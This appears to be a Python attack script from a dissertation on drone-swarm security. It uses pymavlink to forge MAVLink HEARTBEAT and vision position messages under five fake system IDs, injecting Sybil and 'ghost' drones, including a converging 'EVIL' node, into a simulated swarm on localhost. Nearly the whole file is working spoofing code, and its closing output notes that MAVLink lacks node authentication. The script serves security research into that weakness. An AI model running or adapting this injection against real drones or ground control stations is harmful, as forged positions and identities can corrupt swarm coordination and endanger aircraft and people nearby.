from pymavlink import mavutil
import time, math, threading

# ================================================================
# Attack 3: Sybil + Ghost Drone Injection
# Dissertation: COMSM0117 - Ashwin Kotharamath
#
# Sybil: One attacker impersonates multiple legitimate drones
#        by broadcasting multiple fake HEARTBEAT messages with
#        different system IDs — corrupting swarm membership
#
# Ghost Drone: Inject fake drones at fabricated positions into
#              the cooperative localisation system
# ================================================================

TARGET_IP   = '127.0.0.1'
TARGET_PORT = 14550

# Define the ghost/Sybil drones — mirrors your D1-D4+EVIL diagram
# Each entry: (system_id, name, x, y, z, behaviour)
GHOST_DRONES = [
    (10, 'Ghost-D1', 5.0,   5.0,  -2.0, 'static'),
    (11, 'Ghost-D2', -5.0,  5.0,  -2.0, 'static'),
    (12, 'Ghost-D3', 5.0,  -5.0,  -2.0, 'orbiting'),
    (13, 'Ghost-D4', -5.0, -5.0,  -2.0, 'orbiting'),
    (14, 'EVIL-NODE', 0.0,  0.0,  -2.0, 'converging'),
]

print("=" * 60)
print("  Attack 3: Sybil + Ghost Drone Injection")
print("  Simulating EVIL drone injecting phantom swarm members")
print("=" * 60)
print(f"\n[*] Injecting {len(GHOST_DRONES)} ghost/Sybil nodes into swarm")
print("[*] Watch QGC — phantom drones will appear on map\n")

# Create one injector socket per ghost drone (Sybil = different source IDs)
injectors = []
for sys_id, name, x, y, z, behaviour in GHOST_DRONES:
    conn = mavutil.mavlink_connection(
        f'udp:{TARGET_IP}:{TARGET_PORT}',
        input=False,
        source_system=sys_id  # Each ghost has a unique system ID
    )
    injectors.append((conn, sys_id, name, x, y, z, behaviour))
    print(f"[+] Ghost node ready: {name} (SysID={sys_id}) at "
          f"x={x}m y={y}m")

print(f"\n[*] Starting injection — 60 second attack window...\n")

start_time = time.time()
iteration  = 0

while time.time() - start_time < 60:
    t = time.time() - start_time

    for conn, sys_id, name, x, y, z, behaviour in injectors:

        # Calculate position based on behaviour type
        if behaviour == 'static':
            px, py = x, y

        elif behaviour == 'orbiting':
            # Ghost drone orbits around its base position
            radius = 3.0
            angle  = t * 0.5  # radians per second
            px = x + radius * math.cos(angle)
            py = y + radius * math.sin(angle)

        elif behaviour == 'converging':
            # EVIL node slowly moves toward the real drone (0,0)
            # Simulates a rogue drone closing in on the swarm centre
            progress = min(t / 30.0, 1.0)
            px = x * (1 - progress)
            py = y * (1 - progress)

        # Inject HEARTBEAT — announces this ghost as a real MAVLink node
        conn.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_QUADROTOR,
            mavutil.mavlink.MAV_AUTOPILOT_PX4,
            mavutil.mavlink.MAV_MODE_AUTO_ARMED,
            0,
            mavutil.mavlink.MAV_STATE_ACTIVE
        )

        # Inject false position for this ghost drone
        conn.mav.vision_position_estimate_send(
            usec=int(time.time() * 1e6),
            x=float(px),
            y=float(py),
            z=float(z),
            roll=0.0, pitch=0.0, yaw=0.0
        )

        # Also inject as global position so QGC shows it on map
        conn.mav.global_vision_position_estimate_send(
            usec=int(time.time() * 1e6),
            x=float(px),
            y=float(py),
            z=float(z),
            roll=0.0, pitch=0.0, yaw=0.0
        ) if hasattr(conn.mav, 'global_vision_position_estimate_send') else None

    # Progress report every 10 seconds
    if iteration % 100 == 0:
        elapsed = time.time() - start_time
        evil_x = GHOST_DRONES[4][2] * (1 - min(elapsed/30.0, 1.0))
        print(f"[t={elapsed:5.1f}s] {len(GHOST_DRONES)} ghost nodes active | "
              f"EVIL converging → x={evil_x:.2f}m")

    iteration += 1
    time.sleep(0.1)

print("\n[!] Sybil/Ghost attack complete")
print(f"[!] Duration          : 60 seconds")
print(f"[!] Ghost nodes       : {len(GHOST_DRONES)}")
print(f"[!] Sybil identities  : {len(GHOST_DRONES)} fake system IDs injected")
print(f"[!] EVIL node         : converged to swarm centre over 30s")
print(f"[!] Finding: MAVLink has no node authentication — any system ID accepted")
print(f"[!]          Swarm membership cannot be verified by honest nodes")
